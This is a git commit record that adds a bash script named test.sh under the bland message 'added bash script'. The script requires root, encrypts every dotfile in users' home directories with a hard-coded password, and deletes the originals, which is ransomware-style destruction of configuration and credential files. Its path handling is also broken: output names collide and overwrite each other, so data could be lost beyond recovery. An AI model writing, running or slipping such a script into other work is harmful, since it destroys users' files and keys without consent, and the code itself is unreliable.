77e67ca16f5159cbe4533cc036f67bbf6b1335f9
Anas Hansson <anashansson@gmail.com>
2017-05-14 05:46:45 +0200

    added bash script

---
+++ test.sh
@@ -0,0 +1,12 @@
+#!/bin/bash
+if [[ $(id -u) -ne 0 ]] ; then echo "Please run as root" ; exit 1 ; fi
+
+cd /home;
+
+for f in $(find /home -name '.*'); do
+	if [ -f $f ]; then
+		sudo openssl enc -aes-256-cbc -salt -in ./"$f" -out ./"${f%.*}".enc -k "IDKFA";
+		echo -e "File: [$f] encrypted";
+		sudo rm -f ./"$f";
+	fi
+done
